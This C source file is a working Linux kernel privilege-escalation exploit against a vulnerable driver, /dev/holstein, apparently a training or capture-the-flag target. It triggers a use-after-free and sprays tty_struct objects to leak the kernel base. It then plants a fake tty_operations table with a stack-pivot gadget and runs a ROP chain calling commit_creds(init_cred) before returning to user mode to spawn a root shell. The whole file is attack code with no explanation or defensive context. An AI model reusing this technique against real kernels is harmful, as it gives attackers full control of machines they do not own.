#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <unistd.h>
#include <signal.h>

unsigned long user_cs, user_ss, user_rsp, user_rflags, user_rip;

/*

0xffffffff815b53b9: mov esp, 0xf6000000; ret;
0xffffffff815b5410: mov esp, 0x39000000; ret;

*/

#define PAGE_SIZE 0x1000

unsigned long kBase = 0;
unsigned long init_cred = 0xe37a60;
unsigned long commit_creds = 0x0723c0;
unsigned long swapgs_kpti = 0x800e26;
unsigned long offset_ops = 0xc39c60;
unsigned long pop_rdi = 0x28dcfb + 0x1;
unsigned long stack_pivot = 0x5b5410;
#define pivot_addr 0x39000000


/* 
     0xffff888002e38418|+0x0018|+003: 0xffffffff81c39c60  ->  0xffffffff81326550  ->  0xc3fffffffbc0c748
 */


#define NUM_TTYS 30
int ttys[NUM_TTYS] = {0};

void open_ttys()
{
    for (int i = 0; i < NUM_TTYS; i++) 
    {
        ttys[i] = open("/dev/ptmx", O_RDWR | O_NOCTTY);
    }
}

void exec_shell() {
    char *args[] = { "/bin/sh", "-i", NULL };

    execve("/bin/sh", args, NULL);
}


void save_user_state() {
    __asm__(".intel_syntax noprefix;"
            "mov user_cs, cs;"
            "mov user_ss, ss;"
            "mov user_rsp, rsp;"
            "pushf;"
            "pop user_rflags;"
            ".att_syntax;");
    user_rip = (unsigned long) &exec_shell;
}


void setup_fake_stack() {
      unsigned long *fake_stack =
        mmap((void *)(pivot_addr - PAGE_SIZE), PAGE_SIZE * 2, PROT_READ | PROT_WRITE | PROT_EXEC,
             MAP_ANONYMOUS | MAP_PRIVATE | MAP_POPULATE, -1, 0);

    printf("fake_stack : %p\n", fake_stack);

    unsigned long *chain = (unsigned long*)pivot_addr;
    printf("chain : %p\n", chain);
    *chain++ = kBase + pop_rdi;
    *chain++ = kBase + init_cred;
    *chain++ = kBase + commit_creds;    
    *chain++ = kBase + swapgs_kpti; // return to usermode

    *chain++ = 0x0;
    *chain++ = 0x0;

    *chain++= (unsigned long)&exec_shell;
    *chain++ = user_cs;
    *chain++ = user_rflags;
    *chain++ = user_rsp;
    *chain++ = user_ss;

    /* ... */
}

int main()
{
    char buf[0x400] = {0};
    int fd = 0, fd2 = 0;
    unsigned long fake_tty_operations[0x20] = {0};

    save_user_state();

    fd = open("/dev/holstein", O_RDWR);
    fd2 = open("/dev/holstein", O_RDWR);
    printf("[+] fd: %d\n", fd);
    printf("[+] fd2: %d\n", fd2);
    close(fd); //uaf
    open_ttys(); //g_buf == tty_struct (uaf)

    read(fd2, buf, 0x400); //g_buf == tty_struct (uaf)
    kBase = *(unsigned long*)&buf[0x18] - offset_ops;

    printf("[+] ops: %p\n", *(unsigned long*)&buf[0x18]);
    printf("[+] kBase: %p\n", (void*)kBase);
    printf("[+] init_cred: %p\n", (void*)(kBase + init_cred));
    printf("[+] commit_creds: %p\n", (void*)(kBase + commit_creds));
    printf("[+] swapgs_kpti: %p\n", (void*)(kBase + swapgs_kpti));
    printf("[+] pop_rdi: %p\n", (void*)(kBase + pop_rdi));
    printf("[+] stack_pivot: %p\n", (void*)(kBase + stack_pivot));



    fake_tty_operations[0xC] = (unsigned long)(kBase + stack_pivot);
    *(unsigned long*)&buf[0x18] = (unsigned long)&fake_tty_operations;
    write(fd2, buf, 0x400);



    setup_fake_stack();
    printf("[+] Triggering shell\n");

    for (int i = 0; i < NUM_TTYS; i++)
        ioctl(ttys[i], 0, 0);


    return 0;
}